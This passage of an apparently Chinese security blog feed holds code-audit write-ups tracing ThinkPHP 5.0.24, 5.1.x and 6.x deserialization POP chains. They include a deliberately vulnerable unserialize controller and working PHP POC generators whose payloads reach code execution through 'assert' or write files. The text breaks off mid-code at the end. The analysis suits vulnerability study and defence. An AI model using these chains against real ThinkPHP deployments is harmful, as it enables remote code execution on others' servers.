punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Local</span>     <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//对应file_put_contents的第三个参数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md</a></p><p>2.<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/</a></p><p>3.<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;安装tp6.0&lt;/p&gt;
&lt;pre class=&quot; language-shell&quot;&gt;&lt;cod
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.x反序列化链分析</title>
    <link href="http://yoursite.com/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-09T09:44:33.456Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>利用composer下载tp5.1.37的环境</p><pre class=" language-shell"><code class="language-shell">composer create-project --prefer-dist topthink/think thinkphp5.1.37cd thinkphp5.1.37修改composer.json文件里的为：topthink/framework": "5.1.37保存退出执行：composer update</code></pre><p>要进行反序列化攻击，需要可控的unserialize，在index控制器中写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    </code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>这条链的前面部分跟tp5.0.24那条链一样，先全局查找__destruct魔术方法，找到文件<code>/thinkphp/library/think/process/pipes/Windows.php</code></p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进removeFiles方法，file_exists函数执行会把里里面的参数当做字符串，所以可以调用__toString魔术方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里，全局查找__toString，这里存在两条链，我们利用<code>\thinkphp\library\think\model\concern\Conversion.php</code>这条链来构造，这里要怎么调用到__toString方法，而Conversion类是trait关键字声明的，无法被实例化。在类中，可以使用use关键字来继承这个Conversion类，全局查找Conversion类，发现<code>\thinkphp\library\think\Model.php</code></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/1.png" alt="" loading="lazy"></p><p>抽象类不能被实例化，需要找他的子类，发现<code>\thinkphp\library\think\model\Pivot.php</code>，所以payload为：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p>继续跟进__toString魔术方法中toJson-&gt;toArray()方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/2.png" alt="" loading="lazy"></p><p>当$relation可控的时候可以触发__call方法，这里，$this-&gt;append可控就代表key和name可控，跟进getRelation方法看一下</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/3.png" alt="" loading="lazy"></p><p>当条件语句都不满足无任何返回，就继续跟进getAttr方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/4.png" alt="" loading="lazy"></p><p>这里始终都会执行getData，跟进这个函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/5.png" alt="" loading="lazy"></p><p>$this-&gt;data可控，就代表$relation变量可控，所以就可以触发__call方法，全局查找一下。这里可以利用tprce那个那个类来触发命令执行。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/6.png" alt="" loading="lazy"></p><p>这里$this-&gt;hook[$method]是可控，而array_unshift函数会在$args数组前插入新元素，所以导致$args不可控，分析过tp5rce的都知道filterValue方法存在call_user_func可以构造rce。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/7.png" alt="" loading="lazy"></p><p>这里，怎么执行到filterValue，该类的input方法可以调用，但是input方法的参数不可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/8.png" alt="" loading="lazy"></p><p>需要查找哪里调用input方法了，发现param调用了input</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/9.png" alt="" loading="lazy"></p><p>这里$this-&gt;param可控，而name不可控，又需要查找哪里调用param方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isAjax</span><span class="token punctuation">(</span><span class="token variable">$ajax</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$value</span>  <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string">'HTTP_X_REQUESTED_WITH'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string">'xmlhttprequest'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">===</span> <span class="token variable">$ajax</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$result</span>           <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'var_ajax'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mergeParam</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>找到isAjax方法，$this-&gt;config可控，就代表param方法中的name参数可控，就代表input方法中data，name参数都可控，继续回到input方法查看第1373行，在filterValue方法$filters参数要可控</p><pre class=" language-php"><code class="language-php"><span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>跟进getFilter方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/10.png" alt="" loading="lazy"></p><p>$this-&gt;filter可控就代表了filterValue方法$filters参数可控，所以组合起来，poc如下</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token string">"123456"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$param</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"phpinfo()"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/11.png" alt="" loading="lazy"></p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h4><p>不同版本生成的exp不同，如下是影响版本：</p><pre><code>5.1.3 &lt; tp &lt; 5.1.37</code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化</a></p><p>2.<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md</a></p><p>3.<a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;利用composer下载tp5.1.37的环境&lt;/p&gt;
&lt;pre class=&quot; lang
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.0.24反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-05-06T16:00:00.000Z</published>
    <updated>2020-05-07T07:34:44.194Z</updated>
    
    <content type="html"><![CDATA[<p>这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">'Welcome to ThinkPHP!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="POP链构造分析"><a href="#POP链构造分析" class="headerlink" title="POP链构造分析"></a><strong>POP链构造分析</strong></h4><p>首先，进行全局搜索__destruct，查看thinkphp/library/think/process/pipes/Windows.php的Windows类中调用了__destruct魔术方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进removeFiles，发现file__exists函数，file__exists处理的时候会将当作字符串来处理，所以可以调用__toString，全局搜索__toString。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进toJson</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">toJson</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">JSON_UNESCAPED_UNICODE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进toArray方法，这里发现三处可以触发__call方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/1.png" alt="" loading="lazy"></p><p>经过分析最后一处的参数可控，可以调用__call方法，要执行到这里，要满足如下条件：</p><p>$this-&gt;append可控且为数组，进入下面关键两行代码。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$modelRelation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$relation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRelationData</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$relation由$this-&gt;append控制，这里需要找个可控的点，在Model方法中getError方法可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进getRelationData方法，要满足if语句的条件就可以让value可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/2.png" alt="" loading="lazy"></p><p>通过全局搜索isSelfRelation，发现isSelfRelation方法是类Relation，而HasOne，OneToOne是Relation的子类，所以$modelRelation可以实例化HasOne类，继续都下面的代码，要满足：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getBindAttr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>全局搜索getBindAttr，发现OneToOne中存在此方法，发现bindAttr可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBindAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最后value可控，执行<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就可以调用到__call方法，全局查看__call，漏洞触发点在thinkphp/library/think/console/Output.php</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/3.png" alt="" loading="lazy"></p><p>跟进搜索block方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">block</span><span class="token punctuation">(</span><span class="token variable">$style</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeln</span><span class="token punctuation">(</span><span class="token string">"&lt;{$style}>{$message}&lt;/$style>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进writeln，在跟进write</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/4.png" alt="" loading="lazy"></p><p>这里发现$this-&gt;handle可控，可以进行全局搜索wirte方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/5.png" alt="" loading="lazy"></p><p>找到thinkphp/library/think/session/driver/Memcached.php文件中存在write方法，且$this-&gt;handle可控，继续全局查找set方法，在文件thinkphp/library/think/cache/driver/File.php发现存在写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/6.png" alt="" loading="lazy"></p><p>这里跟进getCacheKey方法，查看filename是否可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/7.png" alt="" loading="lazy"></p><p>这里$this-&gt;options可控，目前filename可控了，现在就只需要写入的data可控了，跟进setTagItem方法看一下，发现又执行了一次set。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/8.png" alt="" loading="lazy"></p><p>发现value的值就为传进来的filename。最后，整个的pop链就分析完了，贴上<a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">安全客的一篇文章</a></p><p>的pop链图。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/9.png" alt="" loading="lazy"></p><p>最后，poc如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//触发Model __toString(),子类Pivot合适</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Relation</span><span class="token keyword">use</span> <span class="token package">think<span 